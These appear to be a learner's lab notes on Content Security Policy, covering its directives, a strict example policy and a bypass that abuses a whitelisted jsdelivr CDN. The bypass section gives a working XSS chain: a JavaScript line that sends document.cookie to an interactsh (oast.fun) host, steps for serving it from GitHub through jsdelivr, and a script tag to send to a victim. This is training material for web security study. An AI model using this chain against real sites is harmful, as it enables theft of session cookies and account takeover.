# CSP (Content Security Policy)
This is a defense mechanics aiming to disarm the XSS.
### What are exactly?*
Are a set of directives that tell to the browser if execute of not some resources.

**Examples**:
`Content-Security-Policy: script-src 'self' http://benignsite.htb`
(This tell that all the JS code can be executed if coming only from **benignsite.htb** and self) Remember with self it means JS need to be already in the backend ex `/var/www/html/js/myfile.js` so sideloading it will not work anyway!
If it was **script-src 'inline'** then we could absolutely side-load as we learned in HTB Academy.
```
    style-src: allowed origins for stylesheets
    img-src: allowed origins for images
    object-src: allowed origins for objects such as <object> or <embed>
    connect-src: allowed origins for HTTP requests from scripts. For instance, using XMLHttpRequest
    default-src: fallback value if a different directive is not explicitly set. For instance, if the img-src is not present in the CSP, the                   browser will use this value instead for images
    frame-ancestors: origins allowed to frame the page, for instance, in an <iframe>. This can be used to prevent Clickjacking attacks
    form-action: origins allowed for form submissions
```
Possible values:
```
    *: All origins are allowed
    'none': No origins are allowed
    *.benignsite.htb: All subdomains of benignsite.htb are allowed
    unsafe-inline: Allow inline elements (aka JS into HTML code)
    unsafe-eval: Allow dynamic code evaluation such as JavaScript's eval function
    sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d: Allow an element by hash
    nonce-S0meR4nd0mN0nC3: Allow an element by nonce
```
### Good setting: 
```
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```
This CSP only allows the loading of images, stylesheets, and scripts from the same origin, only allows HTTP requests from JavaScript and form submissions to the same origin, only allows the same origin to frame the web page, and prevents any other resource from loading. The CSP needs to be adjusted accordingly if any external resources are used.


# CSP Bypass Example
```
-!-! jsdelivr.net
```
### How to identify? 
Check from request headers this (`script-src 'self' https://cdn.jsdelivr.net`)
In this case the XSS code(JS) can be executed only from server itself and the **jsdelivr.net**.
### How to Bypass jsdelivr
1)Create a js code that ex-filtrates the code to the Interact.sh:
```
location = "http://jakvbfqydwbsutdxiohxcm4bu5w2eam9f.oast.fun/?cookie="+document.cookie;
```
2)And upload it to GitHub repository: https://github.com/yovecio18/grabber/blob/main/grabber.js
3)Upload the code to the **jsdelivr.net** via: https://www.jsdelivr.com/github
OR(if several commits) https://cdn.jsdelivr.net/gh/USERNAME/REPONAME@COMMIT/FILENAME.js
4)Send the XSS to the victim:
```
<script src="https://cdn.jsdelivr.net/gh/yovecio18/grabber@main/grabber.js"></script>
```
5)profit! (Result in the interact.sh server)
